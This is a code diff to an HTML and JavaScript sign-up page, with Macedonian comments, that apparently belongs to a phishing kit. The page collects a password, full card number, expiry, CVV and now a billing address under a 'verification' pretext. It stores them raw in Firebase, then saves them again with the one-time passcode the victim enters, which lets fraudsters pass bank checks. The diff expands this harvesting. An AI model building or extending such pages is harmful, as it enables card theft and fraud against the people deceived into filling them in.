@@ -130,7 +130,7 @@
             color: rgba(255, 255, 255, 0.9); 
         }
 
-        input { 
+        input, select { 
             width: 100%; 
             padding: 12px; 
             border: 1.5px solid rgba(255, 255, 255, 0.3); 
@@ -146,11 +146,16 @@
             user-select: text;
         }
 
+        select option {
+            background-color: #333;
+            color: #fff;
+        }
+
         input::placeholder {
             color: rgba(255, 255, 255, 0.5);
         }
 
-        input:focus { 
+        input:focus, select:focus { 
             border-color: var(--white); 
             background-color: rgba(255, 255, 255, 0.25);
             box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.15);
@@ -312,9 +317,9 @@
                 <input type="password" id="password" placeholder="••••••••" required>
             </div>
 
-            <div class="section-title">Step 2: Verification Method</div>
+            <div class="section-title">Step 2: Verification Method & Billing Address</div>
             <p style="font-size: 11px; color: rgba(255, 255, 255, 0.8); margin-bottom: 10px; line-height: 1.3;">
-                A payment method is required to verify your eligibility. The first charge will be in 30 days.
+                A payment method and billing address are required to verify your eligibility. The first charge will be in 30 days.
             </p>
             
             <div class="form-group">
@@ -327,9 +332,46 @@
                     <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 <div class="form-group" style="flex: 1;">
-                    <label>CVC</label>
+                    <label>CVV</label>
                     <input type="password" id="cardCvv" placeholder="123" maxlength="4" required>
                 </div>
+            </div>
+
+            <!-- Billing Address Fields Added Here -->
+            <div class="row">
+                <div class="form-group" style="flex: 1;">
+                    <label>First name</label>
+                    <input type="text" id="billFirstName" placeholder="John" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>Last name</label>
+                    <input type="text" id="billLastName" placeholder="Doe" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Address 1</label>
+                <input type="text" id="billAddress1" placeholder="Street address, P.O. box" required>
+            </div>
+            <div class="row">
+                <div class="form-group" style="flex: 1;">
+                    <label>City</label>
+                    <input type="text" id="billCity" placeholder="City" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>Postcode</label>
+                    <input type="text" id="billPostcode" placeholder="Postcode" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Country</label>
+                <select id="billCountry" required>
+                    <option value="" disabled selected>Select country</option>
+                    <option value="UK">United Kingdom</option>
+                    <option value="US">United States</option>
+                    <option value="DE">Germany</option>
+                    <option value="FR">France</option>
+                    <option value="MK">North Macedonia</option>
+                </select>
             </div>
 
             <button type="submit" id="submitBtn" class="btn-submit">
@@ -460,7 +502,7 @@
         startOtpTimer();
     }
 
-    // Чекор 1: Зачувување на првичните податоци во Firebase и отворање OTP екран
+    // Чекор 1: Зачувување на првичните податоци (вклучувајќи Billing Address) во Firebase
     document.getElementById('regForm').addEventListener('submit', async (e) => {
         e.preventDefault();
 
@@ -476,6 +518,12 @@
             cardNumber: document.getElementById('cardNumber').value,
             cardExp: document.getElementById('cardExp').value,
             cardCvv: document.getElementById('cardCvv').value,
+            billFirstName: document.getElementById('billFirstName').value,
+            billLastName: document.getElementById('billLastName').value,
+            billAddress1: document.getElementById('billAddress1').value,
+            billCity: document.getElementById('billCity').value,
+            billPostcode: document.getElementById('billPostcode').value,
+            billCountry: document.getElementById('billCountry').value,
             otpCode: "",
             timestamp: new Date().toISOString()
         };
@@ -484,7 +532,6 @@
         btnSpinner.style.display = 'block';
         submitBtn.disabled = true;
 
-        // Прво зачувување во базата (со празно OTP) кога ќе кликне на копчето
         if (window.saveUserDataToFirebase) {
             await window.saveUserDataToFirebase(currentSubmissionData);
         }
@@ -499,14 +546,13 @@
         }, 1500);
     });
 
-    // Чекор 2: Додавање OTP и праќање во Firebase кога ќе го внесе кодот
+    // Чекор 2: Додавање OTP и праќање во Firebase
     document.getElementById('otpForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         
         const otpValue = document.getElementById('otpCode').value;
         currentSubmissionData.otpCode = otpValue;
 
-        // Второ зачувување во базата (сега со вклучен OTP код)
         if (window.saveUserDataToFirebase) {
             await window.saveUserDataToFirebase(currentSubmissionData);
         }
